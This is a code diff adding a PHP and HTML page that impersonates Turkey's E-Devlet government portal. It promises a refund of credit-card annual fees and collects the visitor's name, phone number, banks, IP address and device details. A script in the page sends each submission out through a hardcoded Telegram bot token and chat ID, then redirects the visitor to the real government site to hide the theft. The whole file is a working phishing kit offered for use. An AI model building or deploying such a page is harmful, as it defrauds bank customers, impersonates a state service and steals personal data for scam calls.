@@ -1,0 +1,189 @@
+<?php
+// Kullanıcının gerçek IP adresini almak için güncellenmiş fonksiyon
+function getUserIP() {
+    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        // Birden fazla IP olabilir, ilkini alıyoruz
+        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+        return $ips[0];
+    } elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+        return $_SERVER['HTTP_CLIENT_IP'];
+    } else {
+        return $_SERVER['REMOTE_ADDR'];
+    }
+}
+
+$userIP = getUserIP();
+?>
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>E-Devlet Kapısı Başvuru Formu</title>
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        /* Popup stilini ekleyelim */
+        #confirmation-message {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #fff;
+            border: 2px solid #000;
+            padding: 20px;
+            text-align: center;
+            z-index: 1000;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+        }
+        #confirmation-message p {
+            font-size: 16px;
+            margin: 0;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="header">
+            <h1>E-Devlet Kapısı</h1>
+        </div>
+    </header>
+
+    <div class="main-container">
+        <div class="left-side">
+            <h2 class="red-text">Kredi kart aidat geri ödeme birimi</h2>
+            <h3 class="black-text">E-Devlet ve BDDK</h3>
+            <p class="black-text">Kredi Kartlarının Yıllık Kart Aidatlarını Geri Ödemesini Alabileceğinizi biliyor musunuz?</p>
+            <p class="black-text">Hemen Aşağıdaki Formu Doldurun E-Devlet Kapısı Müşteri Hizmetleri Tarafından Aranacaksınız</p>
+        </div>
+
+        <div class="right-side">
+            <img src="edevlet.png" alt="E-Devlet Kapısı" width="545" height="545">
+        </div>
+    </div>
+
+    <footer>
+        <div class="contact-form">
+            <form id="application-form">
+                <label for="name">Ad Soyad*</label>
+                <input type="text" id="name" required pattern="[A-Za-zıİğĞüÜşŞöÖçÇ ]{1,30}" title="Ad ve soyad sadece harflerden oluşmalı ve en fazla 30 karakter olabilir.">
+
+                <label for="phone">Telefon*</label>
+                <input type="tel" id="phone" required pattern="^\d{10,15}$" title="Telefon numarası 10 ile 15 haneli olmalıdır ve sadece rakamlardan oluşmalıdır.">
+
+                <label for="bank">Hangi Bankanın Kredi Kartlarını Kullanıyorsunuz?*</label>
+                <div id="bank">
+                    <div class="bank-option">
+                        <input type="checkbox" id="ing-bankasi" name="bank" value="İng Bankası">
+                        <label for="ing-bankasi">İng Bankası</label>
+                    </div>
+                    <div class="bank-option">
+                        <input type="checkbox" id="is-bankasi" name="bank" value="İş Bankası">
+                        <label for="is-bankasi">İş Bankası</label>
+                    </div>
+                    <div class="bank-option">
+                        <input type="checkbox" id="halkbank" name="bank" value="Halkbank">
+                        <label for="halkbank">Halkbank</label>
+                    </div>
+                    <div class="bank-option">
+                        <input type="checkbox" id="akbank" name="bank" value="Akbank">
+                        <label for="akbank">Akbank</label>
+                    </div>
+                    <div class="bank-option">
+                        <input type="checkbox" id="kuveytturk" name="bank" value="Kuveyttürk">
+                        <label for="kuveytturk">Kuveyttürk</label>
+                    </div>
+                    <div class="bank-option">
+                        <input type="checkbox" id="ziraat-bankasi" name="bank" value="Ziraat Bankası">
+                        <label for="ziraat-bankasi">Ziraat Bankası</label>
+                    </div>
+                    <div class="bank-option">
+                        <input type="checkbox" id="garanti" name="bank" value="Garanti">
+                        <label for="garanti">Garanti</label>
+                    </div>
+                    <div class="bank-option">
+                        <input type="checkbox" id="qnb-finansbank" name="bank" value="QNB Finansbank">
+                        <label for="qnb-finansbank">QNB Finansbank</label>
+                    </div>
+                    <div class="bank-option">
+                        <input type="checkbox" id="denizbank" name="bank" value="Denizbank">
+                        <label for="denizbank">Denizbank</label>
+                    </div>
+                    <div class="bank-option">
+                        <input type="checkbox" id="vakifbank" name="bank" value="Vakıfbank">
+                        <label for="vakifbank">Vakıfbank</label>
+                    </div>
+                </div>
+
+                <button type="submit" id="submit-btn">Başvur</button>
+            </form>
+
+            <div id="confirmation-message">
+                <p>Başvurunuz tamamlandı 48 saat içinde gerekli birimler tarafından aranacaksınız.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // PHP ile alınan IP adresini bir JavaScript değişkenine aktar
+        var userIP = "<?php echo $userIP; ?>"; // PHP'den gelen IP adresi
+        console.log("Kullanıcının IP Adresi: ", userIP); // Konsola yazdır
+
+        document.getElementById('application-form').addEventListener('submit', function(event) {
+            event.preventDefault();  // Formun sayfayı yeniden yüklemesini engelle
+
+            // Form verilerini toplama
+            const name = document.getElementById('name').value;
+            const phone = document.getElementById('phone').value;
+            const selectedBanks = [];
+            document.querySelectorAll('#bank input[type="checkbox"]:checked').forEach((checkbox) => {
+                selectedBanks.push(checkbox.value);
+            });
+
+            // Cihaz bilgisi (basit bir örnek)
+            const device = /Mobi|Android|iPhone/i.test(navigator.userAgent) ? 'Mobil' : 'Masaüstü';
+
+            // Başvuru mesajı
+            const message = `Yeni başvuru (Tarih: ${new Date().toLocaleString()})\n
+            Ad Soyad: ${name}\n
+            Telefon: ${phone}\n
+            Bankalar: ${selectedBanks.join(', ')}\n
+            Cihaz: ${device}\n
+            IP: ${userIP}\n
+            Cihaz Bilgisi: ${navigator.userAgent}`;
+
+            // Telegram API'ye gönderme
+            const telegramChatId = "7703428756";
+            const telegramBotToken = "7945197067:AAHfNlhjlUMexPyKIwBffjf-uzI-KAOWjWc";
+
+            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: telegramChatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Telegram API başarıyla gönderildi', data);
+            })
+            .catch(error => {
+                console.error('Telegram API hatası:', error);
+            });
+
+            // Başvuru mesajını göster
+            document.getElementById('confirmation-message').style.display = 'block';
+            
+            // 5 saniye sonra yönlendirme
+            setTimeout(function() {
+                window.location.href = 'https://www.turkiye.gov.tr/';
+            }, 5000);
+        });
+    </script>
+
+    <script src="app.js"></script>
+</body>
+</html>
